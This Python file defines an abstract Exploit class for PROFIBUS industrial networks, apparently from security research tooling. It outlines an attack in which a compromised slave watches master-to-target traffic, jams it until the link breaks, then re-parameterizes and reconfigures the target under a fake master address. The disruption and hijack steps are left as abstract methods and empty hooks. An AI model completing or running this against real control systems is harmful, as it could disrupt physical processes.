from abc import ABC, abstractmethod

from serial import Serial

from pyprofibus.slave.Data_ExchState import Data_ExchState
from pyprofibus.slave.Slave import Slave
from pyprofibus.util import ProfibusError

class Exploit(ABC):

    slave: Slave
    target_address: int
    fake_master_address: int
    serial: Serial
    telegram_all_one: bytes

    def __init__(self, slave, target_address, fake_master_address):
        self.slave = slave
        self.target_address = target_address
        self.fake_master_address = fake_master_address
        self.serial = slave.phy.getSerial()
        self.telegram_all_one = b'\xFF\xFF'

    def run(self):
        self.checkState()
        self.listenForMasterToTargetCommunication()
        while True:
            self.disturbCommunication()
            if self.communicationBroke():
                break
        self.sendParameterization() #hook
        self.sendConfiguration() #hook
    
    def checkState(self):
        if not isinstance(self.slave.getState(), Data_ExchState):
            raise ProfibusError("""Cannot run the exploit, the corrupted
                                 slave is not in DX state.""")
    
    @abstractmethod
    def listenForMasterToTargetCommunication(self):
        return
    
    @abstractmethod
    def disturbCommunication(self):
        return

    @abstractmethod
    def communicationBroke(self) -> bool:
        return
    
    #hook
    def sendParameterization(self):
        return
    
    #hook
    def sendConfiguration(self):
        return
    


